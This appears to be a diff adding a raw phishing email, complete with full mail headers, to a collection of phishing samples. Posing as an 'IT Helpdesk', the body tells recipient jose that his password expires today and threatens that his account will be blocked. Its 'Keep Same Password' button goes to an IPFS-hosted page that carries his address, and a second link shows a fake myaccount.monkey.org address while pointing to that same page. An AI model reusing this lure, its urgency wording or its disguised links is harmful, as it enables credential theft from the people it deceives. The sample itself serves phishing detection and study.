@@ -1,0 +1,175 @@
+Return-Path: admin@lavillahospitality.com
+Delivered-To: jose@monkey.org
+X-FDA: 83233790724.37.24F7E61
+Received: from corporacionhodelpe.hpserverdns.com
+ (corporacionhodelpe.hpserverdns.com [158.69.18.240])
+	by imf17.b.hostedemail.com (Postfix) with ESMTP id B0BB2140003
+	for <jose@monkey.org>; Tue, 18 Mar 2025 07:08:03 +0000 (UTC)
+Authentication-Results: imf17.b.hostedemail.com;
+	dkim=pass header.d=corporacionhodelpe.pe header.s=default header.b=gzm48lr2;
+	spf=softfail (imf17.b.hostedemail.com: 158.69.18.240 is neither permitted nor
+ denied by domain of admin@lavillahospitality.com)
+ smtp.mailfrom=admin@lavillahospitality.com;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1742281683;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=EemYKFVsEme2Wuej7ndZeDiHXJ1qBClTBfNaaMt5nvs=;
+	b=GZ02mmt90UvGP6sAg+WSTJ9JO27Z+d2C5RCZT/cGLnh6CutM3Kci+5twnlYrVha3LXWn0t
+	6bzRiwgTF48mch/5NA9YWQP3qisjQkHdAjysvWtSXmrX/pXie/rwayuZ9r/zwBtRPcx1JV
+	RWvqplPI7/Fwf+koTf0R/lZnv8LzpFE=
+ARC-Authentication-Results: i=1;
+	imf17.b.hostedemail.com;
+	dkim=pass header.d=corporacionhodelpe.pe header.s=default header.b=gzm48lr2;
+	spf=softfail (imf17.b.hostedemail.com: 158.69.18.240 is neither permitted nor
+ denied by domain of admin@lavillahospitality.com)
+ smtp.mailfrom=admin@lavillahospitality.com;
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1742281683; a=rsa-sha256;
+	cv=none;
+	b=3Y2sYyixRncSOqGt0NopAmuntUkTQYEqxCE3HflRLhABAa7HTHcZOaHViIwIkQvByEBKDt
+	TjXmx9m8/UDD53IGpjZV6oB/0f4ntN3u4GfgrnicEjGBwHK9xSRKK7bln9ihEZsTxBkdQJ
+	MUUR3dRQc9IGlGghDQfHIMcSaQL/3fY=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=corporacionhodelpe.pe; s=default; h=Content-Transfer-Encoding:Content-Type:
+	MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=EemYKFVsEme2Wuej7ndZeDiHXJ1qBClTBfNaaMt5nvs=; b=gzm48lr2EYb6uonlP8FVfrhaFD
+	wYE2KA0d0nFzJ0c8Yto4kJgk3tWeUS5+DaHntRNer4j+DeFOKShofrpa70ZWiA0TXeD2qR9OPn1pS
+	OC4YCVbcXiYc3i6oZC/qiFek8GojlOgUnXHo2h3yQa2k4kwjASJebhk2Z3PmZDmY3t3V6zSTwuKC0
+	NQbZH6AvLjuiBzsJ8Tc0DnlheS7L7T143PaNFN4cGgrzIWizEVE6RKohkO2HOlehzIZAi/+Wyl2od
+	5LLj/bbSBWvT42lF0POlOnFrxeabb7XgpogN7zZhEevPoflthSAzVLGp8Klb/a3KKWbWgxSTn8n93
+	gHF1rYuQ==;
+Received: from [66.150.198.196] (port=50698 helo=lavillahospitality.com)
+	by corporacionhodelpe.hpserverdns.com with esmtpa (Exim 4.98.1)
+	(envelope-from <admin@lavillahospitality.com>)
+	id 1tuR3T-0000000FGjQ-295t
+	for jose@monkey.org;
+	Tue, 18 Mar 2025 02:08:02 -0500
+From: IT Helpdesk <admin@lavillahospitality.com>
+To: jose@monkey.org
+Subject: jose@monkey.org: Your account has been set to expire.
+Date: 18 Mar 2025 18:58:34 +0100
+Message-ID: <20250318185834.6E68125C52F3EC1C@lavillahospitality.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - corporacionhodelpe.hpserverdns.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - lavillahospitality.com
+X-Get-Message-Sender-Via: corporacionhodelpe.hpserverdns.com:
+ authenticated_id: programacionsig@corporacionhodelpe.pe
+X-Authenticated-Sender: corporacionhodelpe.hpserverdns.com:
+ programacionsig@corporacionhodelpe.pe
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Server: rspam06
+X-Rspamd-Queue-Id: B0BB2140003
+X-Rspam-User: 
+X-Spam-Status: Yes, score=32.50
+X-Stat-Signature: 6ufjpxiny1mfk35b1so3879soazqkcgk
+X-HE-Tag: 1742281683-405097
+X-HE-Meta: 
+ U2FsdGVkX19sKSONwK2OCyvs8ZJZRPbvXWI4ZSj1SdepVn7KvyHdmuHXza3Gcrlrz+UhLf85C8xYmy9u45Sv101LhndD5BGjs2LLm8YajXiNpNY7kYR5b/waM5F2ZCOBQjv1EymqSK4+4ODMeYJvQBt7Fn1/15yOWD2LID6GqYQwgahjnQTbiO4DxG6LmaQmXQCH/ncS6oEFL0iPct6qWZ+ZD1MVSHHglDQdRLfsmsj8jK0sF1BhzR0IqV6GsehcP0TmYvTEkFx5mF90FemAKnf/QhWnfzG6rdkwoOnmBqfQPjlbwouCKlWSPwpfMBKwFOfaZFgbrUbbig0pI0R2EqcIR9XDsiYmPm4zvPy8NlVU71UkBMawn7W2SUXpHAKwfYEIYWYVPiTqTqUxsAYM7TbdOcRt+TVuh4M0hQXJMJgg+UwbhJ3oJgpE4RqAhM8iqfTEqzOVPASyIGRbFgpfAFjPw6HZVuCCoT2wNOHot2MMjIEofwwEk5zsaRXKg4bkX8gTUImfTcoyoOwX2EME3AHfihbr+QjtSctNoG6VLi3Z/GcVxJvzNahA3xzXh4FiELb1+yVookmO3UJ5yZ1CByrAYD74aamDqjLcYrW+S2Tn8H/Ofc46/xQgZdIWj1AGJodMkcLYMKqER5XzSdLKIU3RohOifZ+JvwnA/9DFhgQtnQ5b69vhif7WKOjizmO4Gty+wxT86kdpYImbD82Frj0dSqqliFP8uGkirZT/RbkvnUhNexHx5GYBjNyEsvH5EuCx+QXUydQBA+4EtXXqRe/BndG2V3phV8Yk1O6zAwoiVgz2sqYVfIXncjK1H+C441dgO+HJjncX+lk2AcD3PQSxuxGb1Gv95P29PNI2ArJwSxM0hd8/H67vuCq8h3dbaKy4ATC1ug7ybmGw3ma0DjvErZ7btzKUYnOfxaK5U3MIOnt5FRm3o/hHPOQ5ijt3ZUs+l9y3lKlLgUBCZ1sw8vaDVnz
+ f+9tYBY92evBPb1ajuoBfNGZbIDnr+bi+qfIcdfdUvqBopjELAgFCt/chl6ZA38I2HNY8/YqZpW8dWteCv9ifbExfsa5KThhIUR9zRfDRSG0pdY30HaXW8n2Vx87g5SHXbGntH1fQ1XTTUvKZhjyGPMp7mTVWkzfWWCuDQjzO4zQDVnA3z5LGLQSIOR6Nva7tOQp4Ko5r5f0RXW6xodsw1pdxhFmmy2aB2fh4kw/5AX7uVLlV/wfKVxbdfrWYVF67YuvF0nrY8CkqQvNblKfgm+HEvqVqRMTd1ATvhRp9FaUHcKv0LtvaXjGL+e87jbXC85X3c4wC/zQPnRBPiCBYJsGfSVaw5BM2pBFdtinCCHcaNk0IhH7zAfqVLMIDjxYYiaF2qq2P77lHIMycBbBAAw0EYDPiTsSSsuKJvSIABlRm8XwVtFI1Z0/nRXNB07IcZ95r4z8lg+ixu+l8nrLGLj/IdcmseinJNGC2kvMPPFHrjykLhj/5A7pcpZtZUuxMISqGM2q6+0r0mBBLcqdw34SpU05mCFuKCQqiZXJ17nkhcoQ6JQxQOiB+hyq1U3BuVDoeSSJWVWkxioWxYfn47Xmf21v7pdPuwWagfLFKcr9LR7fE2oSilKpvar0k0w/IPxLvdWUNsvIONWHN5FiGg9Z2Zfvpi6N1mKjnCQ0CBCIcMDqlADpScewKDTEZ9p1uMkzMZ+K7gB6+/AZeBSoOJKaVJnqBxBvUX26c37WVKXYhdmGpMRvRsjEZ8ByHpPGiUs/TziHcoTmwwub8fZxAhEYHMGKcWqRxK5BFo7kngczK0abNwRkm+nzaaA6rVnCMyVZ4TYbZ6EIZt1lQzp/G2DgtLSGwgTdHYpQZous1iVU5wmP2cMZwXJgzLEoKOVlBsrqzd+kHmN+Oqj7oFVF8SWBjG3BvWpa0TdXJLZupoxomj3c=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 94
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table style=3D"border-width: medium medium 3pt; border-style: none none so=
+lid; border-color: currentColor currentColor rgb(227, 234, 244); width: 133=
+5px; color: rgb(34, 34, 34); text-transform: none; letter-spacing: normal; =
+font-family: Arial, Helvetica, sans-serif; font-size: small; font-style: no=
+rmal; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2;=
+ widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: n=
+ormal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial; font-variant-numer=
+ic: normal; font-variant-east-asian: normal; font-variant-alternates: norma=
+l;" border=3D"1" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td valign=
+=3D"top" style=3D"margin: 0px; padding: 0in 16.5pt; border: currentColor; b=
+order-image: none;">
+<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; vertical-align: baseline; font-variant-numeric: normal; font-va=
+riant-east-asian: normal; font-variant-alternates: normal;"><p style=3D"mar=
+gin: 0in 0in 0pt; color: inherit; line-height: 12pt; font-family: Calibri, =
+sans-serif; font-size: 11pt;">
+<span style=3D"border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; color: black; line-height: inherit; font-family: Helvetica, s=
+ans-serif; font-size: 9pt; font-style: inherit; font-variant: inherit; font=
+-weight: inherit; vertical-align: baseline; font-stretch: inherit;">Dear jo=
+se</span></p><p style=3D"margin: 0in 0in 0pt; line-height: 12pt;"><span sty=
+le=3D"color: inherit; font-family: Calibri, sans-serif; font-size: 11pt;">
+<span style=3D"border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; color: black; line-height: inherit; font-family: Helvetica, s=
+ans-serif; font-size: 9pt; font-style: inherit; font-variant: inherit; font=
+-weight: inherit; vertical-align: baseline; font-stretch: inherit;"><br ari=
+a-hidden=3D"true">The password for your email account (</span>&nbsp;</span>=
+<font color=3D"#000000" face=3D"Helvetica, sans-serif"><span style=3D"font-=
+size: 12px;">jose@monkey.org</span></font>
+<font color=3D"rgba(0,0,0,0)" face=3D"Calibri, sans-serif"><span style=3D"f=
+ont-size: 11pt;">&nbsp;</span></font><span style=3D"border-width: 0px; bord=
+er-color: currentColor; margin: 0px; padding: 0px; color: black; line-heigh=
+t: inherit; font-family: Helvetica, sans-serif; font-size: 9pt; font-style:=
+ inherit; font-variant: inherit; font-weight: inherit; vertical-align: base=
+line; font-stretch: inherit;">)&nbsp;expires today 3/18/2025 6:58:34 p.m.</=
+span>
+<span style=3D"border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; color: black; line-height: inherit; font-family: Helvetica, s=
+ans-serif; font-size: 9pt; font-style: inherit; font-variant: inherit; font=
+-weight: 700; vertical-align: baseline; font-stretch: inherit;">.</span></p=
+><p style=3D"margin: 0in 0in 0pt; color: inherit; line-height: 12pt; font-f=
+amily: Calibri, sans-serif; font-size: 11pt;">
+<span style=3D"border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; color: black; line-height: inherit; font-family: Helvetica, s=
+ans-serif; font-size: 9pt; font-style: inherit; font-variant: inherit; font=
+-weight: inherit; vertical-align: baseline; font-stretch: inherit;">Keep an=
+d continue with the same password using the below portal.<br><br aria-hidde=
+n=3D"true">&nbsp;</span></p>
+<p style=3D"margin: 0in 0in 0pt; color: inherit; line-height: 12pt; font-fa=
+mily: Helvetica, sans-serif;"><font face=3D"Times New Roman" size=3D"2"><b =
+style=3D"margin: 3px; padding: 13px; background-color: rgb(0, 102, 204);">
+<a style=3D"color: rgb(255, 255, 255); text-decoration-line: none;" href=3D=
+"https://ipfs.io/ipfs/bafkreibi7726g6jlhp7r564hkce4cj2e27xasrchvg26r4kcwxtn=
+usrtga/#jose@monkey.org" target=3D"_blank" data-saferedirecturl=3D"https://=
+www.google.com/url?q=3Dhttps://ipfs.io/ipfs/bafkreihtd7anys2hguoyywag2ik3wu=
+b726er3btqzwlcebyspgqx5avpmm%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;u=
+st=3D1742269986123000&amp;usg=3DAOvVaw0qK-WpcTiLbU0kaH7wEpVh">Keep Same Pas=
+sword</a></b></font></p>
+<p style=3D"margin: 0in 0in 0pt; color: inherit; line-height: 12pt; font-fa=
+mily: Helvetica, sans-serif; font-size: 9pt;">&nbsp;</p><p style=3D"margin:=
+ 0in 0in 0pt; color: inherit; line-height: 12pt; font-family: Helvetica, sa=
+ns-serif; font-size: 9pt;"><br>Access to this account will be restricted an=
+d blocked till proper verification.<br>&nbsp;</p><p style=3D"margin: 0in 0i=
+n 0pt; color: inherit; line-height: 12pt; font-family: Calibri, sans-serif;=
+ font-size: 11pt;">
+<span style=3D"border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; color: black; line-height: inherit; font-family: Helvetica, s=
+ans-serif; font-size: 9pt; font-style: inherit; font-variant: inherit; font=
+-weight: inherit; vertical-align: baseline; font-stretch: inherit;">You can=
+ also see security activity at:<br>
+<a style=3D"color: rgb(17, 85, 204);" href=3D"https://ipfs.io/ipfs/bafkreib=
+i7726g6jlhp7r564hkce4cj2e27xasrchvg26r4kcwxtnusrtga/#jose@monkey.org" targe=
+t=3D"_blank" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps:/=
+/ipfs.io/ipfs/bafkreihtd7anys2hguoyywag2ik3wub726er3btqzwlcebyspgqx5avpmm%2=
+3%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1742269986123000&amp;usg=
+=3DAOvVaw0qK-WpcTiLbU0kaH7wEpVh">https://myaccount.monkey.org<wbr>/notifica=
+tions</a></span></p></div></td></tr></tbody></table></body></html>
+
